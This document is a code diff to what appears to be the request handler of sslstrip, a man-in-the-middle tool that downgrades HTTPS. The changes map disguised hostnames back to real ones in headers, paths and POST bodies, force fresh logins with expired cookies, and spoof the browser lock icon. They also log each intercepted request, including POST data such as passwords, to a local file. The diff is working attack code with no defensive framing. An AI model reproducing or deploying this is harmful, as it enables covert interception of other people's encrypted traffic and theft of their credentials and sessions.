@@ -16,7 +16,7 @@
 # USA
 #
 
-import urlparse, logging, os, sys, random
+import urlparse, logging, os, sys, random, re
 
 from twisted.web.http import Request
 from twisted.web.http import HTTPChannel
@@ -34,33 +34,54 @@ from URLMonitor import URLMonitor
 from CookieCleaner import CookieCleaner
 from DnsCache import DnsCache
 
-class ClientRequest(Request):
 
+def NUEVO_LOG(str):
+    return
+
+
+class ClientRequest(Request):
     ''' This class represents incoming client requests and is essentially where
     the magic begins.  Here we remove the client headers we dont like, and then
     respond with either favicon spoofing, session denial, or proxy through HTTP
     or SSL to the server.
-    '''    
-    
+    '''
+    logging = None
+
     def __init__(self, channel, queued, reactor=reactor):
         Request.__init__(self, channel, queued)
-        self.reactor       = reactor
-        self.urlMonitor    = URLMonitor.getInstance()
+        self.reactor = reactor
+        self.urlMonitor = URLMonitor.getInstance()
         self.cookieCleaner = CookieCleaner.getInstance()
-        self.dnsCache      = DnsCache.getInstance()
-#        self.uniqueId      = random.randint(0, 10000)
+        self.dnsCache = DnsCache.getInstance()
+
+    #        self.uniqueId      = random.randint(0, 10000)
 
     def cleanHeaders(self):
         headers = self.getAllHeaders().copy()
-
         if 'accept-encoding' in headers:
             del headers['accept-encoding']
+
+        if 'referer' in headers:
+            real = self.urlMonitor.real
+            if len(real) > 0:
+                dregex = re.compile("(%s)" % "|".join(map(re.escape, real.keys())))
+                headers['referer'] = dregex.sub(lambda x: str(real[x.string[x.start():x.end()]]), headers['referer'])
 
         if 'if-modified-since' in headers:
             del headers['if-modified-since']
 
         if 'cache-control' in headers:
             del headers['cache-control']
+
+        if 'if-none-match' in headers:
+            del headers['if-none-match']
+
+        if 'host' in headers:
+            host = self.urlMonitor.URLgetRealHost("%s" % headers['host'])
+            self.logging.emit("Modifing HOST header: %s -> %s" % (headers['host'], host))
+            headers['host'] = host
+            # headers['securelink'] = '1'
+            self.setHeader('Host', host)
 
         return headers
 
@@ -69,7 +90,7 @@ class ClientRequest(Request):
             index = self.uri.find('/', 7)
             return self.uri[index:]
 
-        return self.uri        
+        return self.uri
 
     def getPathToLockIcon(self):
         if os.path.exists("lock.ico"): return "lock.ico"
@@ -79,70 +100,90 @@ class ClientRequest(Request):
 
         if os.path.exists(scriptPath): return scriptPath
 
-        logging.warning("Error: Could not find lock.ico")
-        return "lock.ico"        
+        self.logging.emit("Error: Could not find lock.ico")
+        return "lock.ico"
+
+    def save_req(self, lfile, str):
+        f = open(lfile, "a")
+        f.write(str)
+        f.close()
 
     def handleHostResolvedSuccess(self, address):
-        logging.debug("Resolved host successfully: %s -> %s" % (self.getHeader('host'), address))
-        host              = self.getHeader("host")
-        headers           = self.cleanHeaders()
-        client            = self.getClientIP()
-        path              = self.getPathFromUri()
+        headers = self.cleanHeaders()
+        #         for header in headers:
+        #         	self.logging.emit("HEADER %s = %s",header,headers[header])
+        self.logging.emit("Resolved host successfully: %s -> %s" % (self.getHeader('host').lower(), address))
+        lhost = self.getHeader("host").lower()
+        host = self.urlMonitor.URLgetRealHost("%s" % lhost)
+        client = self.getClientIP()
+        path = self.getPathFromUri()
+        self.content.seek(0, 0)
+        postData = self.content.read()
+        real = self.urlMonitor.real
+        patchDict = self.urlMonitor.patchDict
 
-        self.content.seek(0,0)
-        postData          = self.content.read()
-        url               = 'http://' + host + path
+        if len(real) > 0:
+            dregex = re.compile("(%s)" % "|".join(map(re.escape, real.keys())))
+            path = dregex.sub(lambda x: str(real[x.string[x.start():x.end()]]), path)
+            postData = dregex.sub(lambda x: str(real[x.string[x.start():x.end()]]), postData)
+            if len(patchDict) > 0:
+                dregex = re.compile("(%s)" % "|".join(map(re.escape, patchDict.keys())))
+                postData = dregex.sub(lambda x: str(patchDict[x.string[x.start():x.end()]]), postData)
+
+        url = 'http://' + host + path
+        headers['content-length'] = "%d" % len(postData)
 
         self.dnsCache.cacheResolution(host, address)
-
         if (not self.cookieCleaner.isClean(self.method, client, host, headers)):
-            logging.debug("Sending expired cookies...")
+            self.logging.emit("Sending expired cookies...")
             self.sendExpiredCookies(host, path, self.cookieCleaner.getExpireHeaders(self.method, client,
                                                                                     host, headers, path))
         elif (self.urlMonitor.isSecureFavicon(client, path)):
-            logging.debug("Sending spoofed favicon response...")
+            self.logging.emit("Sending spoofed favicon response...")
             self.sendSpoofedFaviconResponse()
-        elif (self.urlMonitor.isSecureLink(client, url)):
-            logging.debug("Sending request via SSL...")
+        elif (self.urlMonitor.isSecureLink(client, url) or ('securelink' in headers)):
+            if 'securelink' in headers:
+                del headers['securelink']
+            self.logging.emit("Sending request via SSL...(%s %s)" % (client, url))
             self.proxyViaSSL(address, self.method, path, postData, headers,
                              self.urlMonitor.getSecurePort(client, url))
         else:
-            logging.debug("Sending request via HTTP...")
+            self.logging.emit("Sending request via HTTP...")
             self.proxyViaHTTP(address, self.method, path, postData, headers)
 
     def handleHostResolvedError(self, error):
-        logging.warning("Host resolution error: " + str(error))
-        try:
-            self.finish()
-        except:
-            pass
+        self.logging.emit("Host resolution error: " + str(error))
+        self.finish()
 
     def resolveHost(self, host):
         address = self.dnsCache.getCachedAddress(host)
 
         if address != None:
-            logging.debug("Host cached.")
+            self.logging.emit("Host cached.")
             return defer.succeed(address)
         else:
-            logging.debug("Host not cached.")
+            self.logging.emit("Host not cached.")
             return reactor.resolve(host)
 
     def process(self):
-        logging.debug("Resolving host: %s" % (self.getHeader('host')))
-        host     = self.getHeader('host')               
+        host = self.urlMonitor.URLgetRealHost("%s" % self.getHeader('host'))
+        self.logging.emit("Resolving host: %s" % host)
         deferred = self.resolveHost(host)
 
         deferred.addCallback(self.handleHostResolvedSuccess)
         deferred.addErrback(self.handleHostResolvedError)
-        
+
     def proxyViaHTTP(self, host, method, path, postData, headers):
-        connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
+        connectionFactory = ServerConnectionFactory(method, path, postData, headers, self)
+        self.save_req("debug_ssl.log", method + ' http://' + host + path + '\n' + str(headers) + '\n' + postData + '\n')
         connectionFactory.protocol = ServerConnection
         self.reactor.connectTCP(host, 80, connectionFactory)
 
     def proxyViaSSL(self, host, method, path, postData, headers, port):
-        clientContextFactory       = ssl.ClientContextFactory()
-        connectionFactory          = ServerConnectionFactory(method, path, postData, headers, self)
+        self.save_req("debug_ssl.log",
+                      method + ' https://' + host + path + '\n' + str(headers) + '\n' + postData + '\n')
+        clientContextFactory = ssl.ClientContextFactory()
+        connectionFactory = ServerConnectionFactory(method, path, postData, headers, self)
         connectionFactory.protocol = SSLServerConnection
         self.reactor.connectSSL(host, port, connectionFactory, clientContextFactory)
 
@@ -150,18 +191,18 @@ class ClientRequest(Request):
         self.setResponseCode(302, "Moved")
         self.setHeader("Connection", "close")
         self.setHeader("Location", "http://" + host + path)
-        
+
         for header in expireHeaders:
             self.setHeader("Set-Cookie", header)
 
-        self.finish()        
-        
+        self.finish()
+
     def sendSpoofedFaviconResponse(self):
         icoFile = open(self.getPathToLockIcon())
 
         self.setResponseCode(200, "OK")
         self.setHeader("Content-type", "image/x-icon")
         self.write(icoFile.read())
-                
+
         icoFile.close()
         self.finish()
